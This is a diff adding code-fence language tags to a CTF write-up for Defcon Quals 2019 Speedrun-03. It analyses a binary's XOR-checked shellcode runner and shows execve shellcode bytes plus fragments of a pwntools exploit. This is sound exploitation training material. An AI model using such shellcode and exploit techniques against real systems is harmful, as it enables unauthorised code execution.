@@ -1,7 +1,7 @@
 # Defcon Quals 2019 Speedrun---03
 
 First let's take a look at the binary:
-```
+```console
 $    pwn checksec speedrun
 [*] '/Hackery/defcon/s3/speedrun'
     Arch:     amd64-64-little
@@ -20,7 +20,7 @@ You're not ready.
 
 So we can see that it has all of the standard binary mitigations, and that it is a 64 bit elf that prompts us for input. When we look at the main function in Ghidra, we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -39,7 +39,7 @@ undefined8 main(void)
 
 Looking through the functions, the one of interest to us is `get_that_shellcode()`:
 
-```
+```c
 void get_that_shellcode(void)
 
 {
@@ -93,7 +93,7 @@ void get_that_shellcode(void)
 
 Here we can see it scans in `0x1e` bytes worth of input into `buf`, which then `strlen` is called on it. If the output of strlen is `30` then we can proceed. It also checks for NOPS (opcode `0x90`) in our input with `strchr`. Then runs the first half and second half of our input through the `xor` function, and checks to see if the results are the same. The `xor` function just goes through and xors the first `x` number of bytes it has been given, where `x` is the second argument and returns the output as a single byte:
 
-```
+```c
 ulong xor(long lParm1,uint uParm2)
 
 {
@@ -112,7 +112,7 @@ ulong xor(long lParm1,uint uParm2)
 
 So in order for our shellcode to run, the first half of our shellcode when all the bytes are xored together must be equal to the second half of the shellcode xored together. Then if it passes that check, our input is ran as shellcode in the `shellcode_it` function:
 
-```
+```c
 void shellcode_it(void *pvParm1,uint uParm2)
 
 {
@@ -129,7 +129,7 @@ So in order to get a shell, we will just need to send it a `30` byte shellcode w
 
 To figure out what specific byte at the end, we can do that with a bit of python math. First xor the first part by itself to figure out what we need to get the right side equal to:
 
-```
+```pycon
 >>> part0 = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf"
 >>> len(part0)
 15
@@ -144,7 +144,7 @@ To figure out what specific byte at the end, we can do that with a bit of python
 
 So we can see that the xor must equal `0x2f`. Let's see what the other half of the xor will be if we append 4 `\x50`s to the end:
 
-```
+```pycon
 >>> part1 = "\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
 >>> part1 += "\x50"*5
 >>> len(part1)
@@ -159,14 +159,14 @@ So we can see that the xor must equal `0x2f`. Let's see what the other half of t
 
 To figure out what the missing byte is, we can just xor `0x28` and `0x2f` together:
 
-```
+```pycon
 >>> 0x28 ^ 0x2f
 7
 ```
 
 With that, we can see that the final byte of the second part will need to be `7` to pass the checks. Putting it all together, we get the following exploit:
 
-```
+```python
 from pwn import *
 
 # Establish the target process
@@ -190,7 +190,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $ python exploit.py
 [+] Starting local process './speedrun-003': pid 5605
 [*] Switching to interactive mode
